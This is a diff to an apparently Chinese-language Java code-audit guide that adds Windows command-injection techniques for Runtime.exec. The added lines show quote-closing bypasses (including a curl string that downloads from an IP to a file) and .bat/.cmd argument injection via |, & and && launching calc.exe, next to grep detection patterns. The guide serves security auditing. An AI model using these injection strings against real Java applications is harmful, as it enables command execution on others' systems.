@@ -66,4 +66,34 @@ grep 模式:
   ScriptEngine.*eval\s*\(
   javax\.script
 ```
-**风险：** `ScriptEngine.eval()` 在 JVM 内执行脚本。如果脚本内容或绑定包含用户输入，可能导致代码注入。
+**风险：** `ScriptEngine.eval()` 在 JVM 内执行脚本（如 JavaScript）。如果脚本内容或绑定包含用户输入，可能导致代码注入。JavaScript 中可直接执行 Java 命令（如 `java.lang.Runtime.getRuntime().exec()`）。
+
+## Windows \" 闭合绕过
+
+Java `Runtime.exec(String[])` 中，第一个元素为命令，其余为参数。如果只能控制第一个值：
+
+```java
+// 通过 \" 闭合并添加参数
+String inputStr = "ipconfig\" -all";
+String[] cmd = new String[]{inputStr};
+Runtime.getRuntime().exec(cmd);
+// 实际执行: ipconfig -all
+
+// 下载文件
+String inputStr = "curl\" 10.31.234.176:8088 -o \"D:\\testurl.txt";
+
+// 限制：参数以 / 开头会被转义为 \，只能注入非 / 开头的参数
+```
+
+## Windows .bat/.cmd 参数注入
+
+```java
+// 第一个值为 .bat/.cmd 脚本时，后续参数可通过 &| 注入新命令
+String[] cmdArr = new String[]{"D:/test.bat", userInput};
+Runtime.getRuntime().exec(cmdArr);
+// userInput = "|calc.exe"  → 执行 calc.exe
+// userInput = "&calc.exe"  → 执行 calc.exe
+// userInput = "&&calc.exe" → 执行 calc.exe
+```
+
+**原因：** JRE 用空格拼接数组元素后调用 `CreateProcessW`，`.bat` 文件由 `cmd.exe /c` 解析，`|`、`&`、`&&` 被当作命令分隔符。
